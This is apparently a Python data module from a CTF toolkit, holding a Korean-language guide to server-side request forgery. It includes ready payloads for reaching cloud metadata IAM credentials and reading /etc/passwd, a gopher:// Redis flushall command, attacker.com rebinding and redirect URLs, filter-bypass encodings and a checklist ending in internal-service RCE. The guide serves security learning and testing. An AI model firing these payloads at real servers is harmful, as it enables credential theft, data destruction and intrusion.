"""Server-Side Request Forgery (SSRF) Learning Guide."""

SSRF_GUIDE = {
    "attack_type": "ssrf",
    "title": "Server-Side Request Forgery (SSRF) Guide",
    "severity": "high",
    "difficulty": "intermediate",

    "overview": """SSRF는 서버가 사용자 입력을 기반으로 외부/내부 리소스에 요청을 보낼 때 발생합니다.
공격자는 이를 통해 내부 네트워크 스캔, 클라우드 메타데이터 접근, 인증 우회 등을 수행할 수 있습니다.

클라우드 환경(AWS, GCP, Azure)에서는 메타데이터 엔드포인트를 통해 자격 증명을 탈취할 수 있어 특히 위험합니다.
URL 파라미터, Webhook, 파일 업로드(SVG, PDF), API 호출 등에서 발견됩니다.""",

    "impact": [
        "내부 네트워크 서비스 접근 (Redis, Memcached, DB)",
        "클라우드 메타데이터 및 자격 증명 탈취",
        "방화벽 우회",
        "포트 스캔 및 서비스 열거",
        "다른 취약점과 연계 (RCE)",
    ],

    "vulnerable_patterns": [
        "requests.get(user_url)",
        "file_get_contents($_GET['url']);",
        "curl.setopt(CURLOPT_URL, userInput);",
    ],

    "techniques": {
        "basic": {
            "name": "Basic SSRF",
            "difficulty": "beginner",
            "how_it_works": """기본 SSRF는 URL 파라미터를 통해 서버가 임의의 URL에 요청을 보내게 합니다.
localhost, 127.0.0.1, 내부 IP 등을 시도하여 내부 서비스에 접근합니다.""",
            "prerequisites": [
                "서버가 사용자 제공 URL에 요청을 보냄",
                "내부 네트워크 접근이 차단되지 않음",
            ],
            "payloads": [
                {"payload": "http://127.0.0.1", "purpose": "로컬호스트 접근", "expected": "로컬 서비스 응답"},
                {"payload": "http://localhost", "purpose": "localhost 접근", "expected": "로컬 서비스 응답"},
                {"payload": "http://[::1]", "purpose": "IPv6 localhost", "expected": "로컬 서비스 응답"},
                {"payload": "http://0.0.0.0", "purpose": "모든 인터페이스", "expected": "로컬 서비스 응답"},
                {"payload": "http://127.0.0.1:22", "purpose": "SSH 포트 스캔", "expected": "SSH 배너 또는 에러"},
                {"payload": "http://192.168.1.1", "purpose": "내부 네트워크", "expected": "내부 서비스 응답"},
            ],
            "detection_patterns": [
                "내부 서비스의 응답이 반환됨",
                "로컬 파일 내용이 표시됨",
                "다른 응답 코드/시간",
            ],
            "common_mistakes": [
                "localhost만 시도 - 다양한 표현 방식 시도 필요",
                "HTTP만 시도 - file://, gopher://, dict:// 등도 시도",
            ],
        },

        "cloud_metadata": {
            "name": "Cloud Metadata SSRF",
            "difficulty": "intermediate",
            "how_it_works": """클라우드 환경에서는 메타데이터 서비스가 169.254.169.254에서 실행됩니다.
SSRF를 통해 접근하면 인스턴스 정보, IAM 자격 증명 등을 탈취할 수 있습니다.""",
            "prerequisites": [
                "AWS, GCP, Azure 등 클라우드 환경",
                "메타데이터 서비스 접근 가능",
            ],
            "payloads": [
                {"payload": "http://169.254.169.254/latest/meta-data/", "purpose": "AWS 메타데이터", "expected": "인스턴스 정보"},
                {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "purpose": "AWS IAM 역할 목록", "expected": "IAM 역할 이름"},
                {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]", "purpose": "AWS 자격 증명", "expected": "AccessKeyId, SecretAccessKey"},
                {"payload": "http://metadata.google.internal/computeMetadata/v1/", "purpose": "GCP 메타데이터", "expected": "인스턴스 정보"},
                {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "purpose": "Azure 메타데이터", "expected": "인스턴스 정보"},
            ],
            "detection_patterns": [
                "메타데이터 응답 구조가 반환됨",
                "AccessKeyId, SecretAccessKey 노출",
                "인스턴스 ID, 리전 정보 노출",
            ],
            "common_mistakes": [
                "IMDSv2에서는 토큰이 필요 - PUT 요청으로 토큰 획득 필요",
                "GCP는 특별한 헤더 필요 - Metadata-Flavor: Google",
            ],
        },

        "protocol_smuggling": {
            "name": "Protocol Smuggling",
            "difficulty": "advanced",
            "how_it_works": """gopher://, dict://, file:// 등의 프로토콜을 사용하여 다양한 서비스와 통신합니다.
gopher://는 원시 TCP 데이터를 전송할 수 있어 Redis, Memcached 등을 공격할 수 있습니다.""",
            "prerequisites": [
                "다양한 URL 스킴이 허용됨",
                "대상 서비스가 텍스트 기반 프로토콜 사용",
            ],
            "payloads": [
                {"payload": "file:///etc/passwd", "purpose": "로컬 파일 읽기", "expected": "passwd 내용"},
                {"payload": "dict://127.0.0.1:6379/INFO", "purpose": "Redis 정보 조회", "expected": "Redis 정보"},
                {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "purpose": "Redis flushall", "expected": "데이터 삭제"},
                {"payload": "gopher://127.0.0.1:11211/_stats%0d%0a", "purpose": "Memcached stats", "expected": "통계 정보"},
            ],
            "detection_patterns": [
                "파일 내용이 응답에 포함됨",
                "내부 서비스 응답 수신",
            ],
            "common_mistakes": [
                "URL 인코딩 필요 - %0d%0a = CRLF",
                "gopher는 더블 인코딩이 필요할 수 있음",
            ],
        },

        "dns_rebinding": {
            "name": "DNS Rebinding",
            "difficulty": "advanced",
            "how_it_works": """DNS 리바인딩은 도메인의 IP를 동적으로 변경하여 same-origin policy를 우회합니다.
첫 번째 DNS 조회는 공격자 서버를, 두 번째는 내부 IP를 반환하도록 설정합니다.""",
            "prerequisites": [
                "URL 검증 후 실제 요청까지 시간 간격이 있음",
                "공격자가 DNS 서버를 제어 가능",
            ],
            "payloads": [
                {"payload": "http://rebind.attacker.com", "purpose": "DNS 리바인딩 도메인", "expected": "첫 요청: 외부 IP, 두 번째: 내부 IP"},
            ],
            "detection_patterns": [
                "검증 통과 후 실제로는 내부 IP로 요청",
            ],
            "common_mistakes": [
                "TTL이 너무 길면 실패 - 짧은 TTL 필요",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "URL 입력 포인트 식별",
            "expected_result": "URL을 입력받는 모든 기능 파악",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "이미지 URL, Webhook, 프록시, API 호출 등"
        },
        {
            "step": 2,
            "action": "외부 서버로 요청 확인",
            "expected_result": "서버에서 요청이 발생하는지 확인",
            "command_example": "ctf-toolkit ssrf scan -u 'http://target.com?url='",
            "notes": "Burp Collaborator, webhook.site 사용"
        },
        {
            "step": 3,
            "action": "localhost 접근 테스트",
            "expected_result": "내부 서비스 응답",
            "command_example": None,
            "notes": "127.0.0.1, localhost, [::1], 0.0.0.0 등"
        },
        {
            "step": 4,
            "action": "클라우드 메타데이터 접근",
            "expected_result": "메타데이터 정보 또는 자격 증명",
            "command_example": None,
            "notes": "169.254.169.254, metadata.google.internal"
        },
        {
            "step": 5,
            "action": "내부 포트 스캔",
            "expected_result": "열린 포트 및 서비스 식별",
            "command_example": None,
            "notes": "22, 80, 443, 3306, 6379, 27017 등"
        },
        {
            "step": 6,
            "action": "다른 프로토콜 테스트",
            "expected_result": "file://, gopher://, dict:// 동작 여부",
            "command_example": None,
            "notes": "프로토콜별 공격 가능성 확인"
        },
        {
            "step": 7,
            "action": "필터 우회 시도",
            "expected_result": "IP/도메인 블랙리스트 우회",
            "command_example": None,
            "notes": "IP 표현 방식, 리다이렉트, DNS 리바인딩"
        },
        {
            "step": 8,
            "action": "내부 서비스 공격",
            "expected_result": "Redis RCE, 내부 API 호출 등",
            "command_example": None,
            "notes": "gopher://로 명령 전송"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "내부 서비스 응답이 반환됨",
            "confidence": "high",
            "db_specific": None,
            "example_response": "root:x:0:0:root:/root:/bin/bash"
        },
        {
            "pattern_type": "behavior",
            "indicator": "클라우드 메타데이터 노출",
            "confidence": "high",
            "db_specific": None,
            "example_response": "ami-id\ninstance-id\nlocal-hostname"
        },
        {
            "pattern_type": "behavior",
            "indicator": "외부 서버에서 요청 수신",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "timing",
            "indicator": "내부 IP 시 응답 시간 차이",
            "confidence": "medium",
            "db_specific": None,
            "example_response": None
        },
    ],

    "waf_bypass": [
        {
            "technique": "IP 표현 변형",
            "example": "127.0.0.1 → 2130706433 (decimal), 0x7f000001 (hex)",
            "effective_against": "IP blacklists"
        },
        {
            "technique": "IPv6 사용",
            "example": "[::1], [0:0:0:0:0:ffff:127.0.0.1]",
            "effective_against": "IPv4 only filters"
        },
        {
            "technique": "URL 인코딩",
            "example": "http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31",
            "effective_against": "Simple pattern matching"
        },
        {
            "technique": "리다이렉트 이용",
            "example": "http://attacker.com/redirect?url=http://127.0.0.1",
            "effective_against": "Request-time validation"
        },
    ],

    "ctf_tips": [
        "http://127.0.0.1:PORT로 빠르게 포트 스캔",
        "AWS는 169.254.169.254/latest/meta-data/ 필수 체크",
        "응답이 없으면 Blind SSRF - 시간 차이 또는 OOB로 확인",
        "gopher://로 Redis에 명령 전송하여 RCE 가능",
        "file:///etc/passwd로 LFI와 유사한 효과",
        "내부 API 엔드포인트 호출로 권한 상승 시도",
        "Burp Collaborator 또는 interactsh로 OOB 확인",
        "0.0.0.0, 0, 127.1 등 다양한 localhost 표현 시도",
    ],
}
